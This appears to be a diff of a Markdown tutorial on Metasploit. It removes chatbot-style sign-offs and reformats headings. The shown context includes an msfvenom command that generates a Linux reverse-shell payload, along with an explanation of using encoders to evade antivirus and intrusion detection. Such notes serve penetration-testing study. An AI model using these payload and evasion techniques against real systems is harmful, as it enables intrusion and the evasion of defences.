@@ -165,9 +165,9 @@ This will display a list of commands available in the Metasploit console.
   msfupdate
   ```
 
-Let me know if you'd like further clarification or a deeper dive into any specific commands or workflows!
 
-Here are more **examples for creating payloads** using `msfvenom`. These examples cover various platforms, formats, and use cases.
+---
+# Here are more **examples for creating payloads** using `msfvenom`. These examples cover various platforms, formats, and use cases.
 
 ---
 
@@ -351,8 +351,8 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f hex
 
 ---
 
-Let me know if you need additional examples or help with specific scenarios!
 
+---
 ### **Encoders in Metasploit**
 
 Encoders in Metasploit are used to obfuscate payloads to bypass detection mechanisms, such as antivirus software and intrusion detection systems (IDS). Encoding helps avoid detection by reformatting the payload without altering its functionality.
